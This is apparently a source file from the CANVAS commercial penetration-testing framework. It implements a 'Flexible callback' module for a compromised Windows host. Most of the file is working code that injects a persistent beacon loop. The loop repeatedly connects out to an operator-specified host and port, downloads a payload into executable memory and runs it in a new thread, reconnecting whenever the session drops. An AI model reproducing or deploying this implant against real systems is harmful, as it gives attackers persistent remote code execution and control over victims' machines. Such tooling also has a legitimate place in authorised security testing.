#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path: 
    sys.path.append(".")

import socket
from exploitutils import *
from canvasexploit import canvasexploit

from ExploitTypes.localcommand import LocalCommand

NAME                    = "Flexible callback"
DESCRIPTION             = "Flexible MOSDEF callbacks"
VERSION                 = "1.1"

PROPERTY                = {}
PROPERTY['TYPE']        = "Commands"
PROPERTY['ARCH']        = [ ["Windows"] ]

DOCUMENTATION           = {}
DOCUMENTATION['Notes']  = """

With this module you can send a MOSDEF callback to a specified location. Optionally
you can make it callback to this location n or infinite times, with a specified
interval.

This module does not support MOSDEF UNIVERSAL listeners.
You will need to spawn a WIN32 INTEL listener and enable fromcreatethread.

"""

NOTES                   = """

Commandline usage example:

Win32/MOSDEF$ runmodule callbackloop -O callback_host:172.16.59.1 -O callback_port:8080 -O callrepeat:2 -O callinterval:20

This would set up a callback to 172.16.59.1 on port 8080, it would sleep 20 seconds between tries and give up
after two repeats.

Note that the specified number of connection tries will _always_ be attempted, regardless if they succeed or not.
A connection will however, only be attempted when there is no active existing connection to CANVAS.

In other words, with a currently active connection, the 'connection tries' counter does not decrement and
no connection attempts are made. Once that connection drops, for any reason, the callback loop resumes
its behavior.

"""

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.name           = NAME
        self.node           = None
        self.callback_host  = "192.168.36.1"
        self.callback_port  = 5001
        self.callrepeat     = 0
        self.callinterval   = 20
        self.is_win64       = False

    def neededListenerTypes(self): 
        return []

    def callbackLoop(self):
        """ sets up a callback loop thread """
        callbackVars = {}
        
        ip = socket.gethostbyname(self.callback_host)
        ip = str2bigendian(socket.inet_aton(ip))
        
        callbackVars["IP"]          = ip
        callbackVars["PORT"]        = self.callback_port
        callbackVars["INTERVAL"]    = self.callinterval
        callbackVars["REPEAT"]      = self.callrepeat
        callbackVars["AF_INET"]     = 2

        self.log("[!] attempting callback loop to %s:%d with repeat %d and interval %d"% \
                (self.callback_host, self.callback_port, self.callrepeat, self.callinterval))
        
        callbackCode = """
        #include "socket.h"
        
        #import "int", "AF_INET" as "AF_INET"
        #import "int", "IP" as "IP"
        #import "int", "PORT" as "PORT"
        #import "int", "REPEAT" as "REPEAT"
        #import "int", "INTERVAL" as "INTERVAL"

        #import "IMPORT_TYPE", "ws2_32.dll|connect" as "connect"
        #import "IMPORT_TYPE", "ws2_32.dll|closesocket" as "closesocket"
        #import "IMPORT_TYPE", "ws2_32.dll|socket" as "socket"
        #import "IMPORT_TYPE", "ws2_32.dll|send" as "send"
        #import "IMPORT_TYPE", "ws2_32.dll|recv" as "recv"
        #import "IMPORT_TYPE", "kernel32.dll|Sleep" as "Sleep"
        #import "IMPORT_TYPE", "kernel32.dll|CreateThread" as "CreateThread"
        #import "IMPORT_TYPE", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"
        #import "IMPORT_TYPE", "kernel32.dll|GetExitCodeThread" as "GetExitCodeThread"
        
        #import "local", "sendint" as "sendint"
        #import "local", "htons" as "htons"
        #import "local", "htonl" as "htonl"

                                
        void callbackLoop(char *ip, int port, int inverval)
        {
            struct sockaddr_in serv_addr;
            char *buf;
            char *push;
            
            int fd;
            int rlen;
            int n;
            HANDLE_TYPE hThread;
            int callCount;
            int code;

            hThread = 0;
        
            if (REPEAT == 0)
            {
                callCount = 1;
            }
            else
            {
                callCount = REPEAT;
            }
            
            while(callCount)
            {
                if (hThread == 0) {
                    fd = socket(AF_INET, 1, 0);
                    serv_addr.family = AF_INET; 
                    serv_addr.addr = htonl(ip); // XXX: why doesn't this follow sin_addr.addr semantics ?
                    serv_addr.port = htons(port);

                    if (connect(fd, &serv_addr, 16) == 0) 
                    {
                        // XXX: how are we going to get the fd into esi for MOSDEF ?
                        // XXX: maybe prepend a push fd, pop esi stub to buf ?
                        recv(fd, &rlen, 4, 0);

                        buf = VirtualAlloc(0, rlen+6000, 0x1000, 0x40);

                        // the 6000 here is some buffer for MOSDEF stack
                        buf = buf + 6000;
                    
                        n = 0;
                        while(rlen)
                        {
                            n = recv(fd, buf + n, rlen, 0);
                            rlen = rlen - n;
                        }
                    
                        // createthread the MOSDEF thread
                        // XXX: means we need fromcreatethread on listener !!!
                        hThread = CreateThread(0, 0, buf, fd, 0, 0);
                    }
                    else // XXX: prevent leaks
                    {
                        closesocket(fd);
                    }
                } else {
                    GetExitCodeThread(hThread, &code);
        
                    if (code != 259) { // STILL_ACTIVE
                        CloseHandle(hThread);
                        hThread = 0;
                    }
                }

                n = INTERVAL;
                while(n)
                {
                    Sleep(1000);
                    n = n - 1;
                }   
         
                if (REPEAT != 0)
                {   if (hThread == 0) {
                        callCount = callCount - 1;
                    }
                }
            }
        }
                    
        void main()
        {
            callbackLoop(IP, PORT, INTERVAL);
        }
        """
        callbackCode = callbackCode.replace('IMPORT_TYPE', 'local' if self.is_win64 else 'remote')
        callbackCode = callbackCode.replace('HANDLE_TYPE', 'long long' if self.is_win64 else 'int')
        return self.node.shell.compile(callbackCode, callbackVars)

    def localThread(self, code):
        threadVars = {}

        threadVars["CODESIZE"] = len(code)
        threadVars["THREADME"] = code

        threadCode = """
        #import "IMPORT_TYPE", "kernel32.dll|CreateThread" as "CreateThread"
        #import "IMPORT_TYPE", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "IMPORT_TYPE", "kernel32.dll|VirtualAlloc" as "VirtualAlloc"

        #import "local", "sendint" as "sendint"

        #import "int",    "CODESIZE" as "CODESIZE"
        #import "string", "THREADME" as "THREADME"

        void main()
        {
            HANDLE_TYPE hThread;
            char *fp;
            char *tp;
            int i;

            fp = VirtualAlloc(0, CODESIZE, 0x1000, 0x40);

            if (fp == 0) {
                sendint(0);
                return;
            }
            
            tp = THREADME;

            for (i = 0; i < CODESIZE; i = i + 1)
            {
                fp[i] = tp[i];
            }

            hThread = CreateThread(0, 0, fp, 0, 0, 0);
            
            if (hThread == 0)
            {
                // failed
                sendint(0);
                return;
            }
            
            CloseHandle(hThread);
            sendint(1);
        }
        """
        threadCode = threadCode.replace('IMPORT_TYPE', 'local' if self.is_win64 else 'remote')
        threadCode = threadCode.replace('HANDLE_TYPE', 'long long' if self.is_win64 else 'int')
        return self.node.shell.runCode(threadCode, threadVars)

    def getArgs(self):
        """ get all the arguments from the commandline or gui """
        self.getarg("callback_host")
        self.getarg("callback_port")
        self.getarg("callrepeat")
        self.getarg("callinterval")
        
    def run(self):
        self.getArgs()

        self.node  = self.argsDict["passednodes"][0]
        
        if "win32api" not in self.node.capabilities:
            self.log( "[!] currently only win32 nodes support callback loop ..." )
            return 0

        if self.node.nodetype in ['win64Node']:
            self.is_win64 = True
        else:
            self.is_win64 = False

        code       = self.callbackLoop()
        result     = self.localThread(code)

        if result:
            self.log( "[!] callback loop started ..." )
        else:
            self.log( "[!] callback loop could not be started ..." )

        return result
    

